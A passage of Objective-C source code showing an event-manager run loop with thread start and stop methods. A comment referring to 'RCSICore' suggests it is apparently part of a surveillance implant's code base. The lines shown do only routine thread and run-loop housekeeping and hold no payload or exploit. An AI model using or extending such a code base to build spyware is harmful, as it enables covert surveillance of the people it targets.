  [self addTimersToCurrentRunLoop];
  
  // RCSICore send notification to this...
  while (eventManagerStatus == EVENT_MANAGER_RUNNING)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

      [eventManagerRunLoop runMode: kRunLoopEventManagerMode 
                        beforeDate: [NSDate dateWithTimeIntervalSinceNow:0.750]];

      // process incoming logs out of the runloop
      [self processIncomingEvents];   
      
      [pool release];
    }
  
  // remove source port, release machport, remove action queue
  [self removeTimersFromCurrentRunLoop]; 
  
  [eventManagerRunLoop removePort: notificationPort 
                          forMode: kRunLoopEventManagerMode];
                       
  [notificationPort release];

  // set to nil for error handling: core test if it nil
  // and don't send msgs to this
  notificationPort = nil;
  
  // work is done: stop the manager
  eventManagerStatus = EVENT_MANAGER_STOPPED;
}

- (void)start
{
  [NSThread detachNewThreadSelector: @selector(eventManagerRunLoop) 
                           toTarget: self withObject:nil];
}

// Excecuted by another thread
- (BOOL)stop
{
  eventManagerStatus = EVENT_MANAGER_STOPPING;
  
  for (int i=0; i<5; i++) 
    { 
      if (eventManagerStatus == EVENT_MANAGER_STOPPED)
        break;
      sleep(1);
    }
  
  return eventManagerStatus == EVENT_MANAGER_STOPPED ? TRUE : FALSE;
}

@end
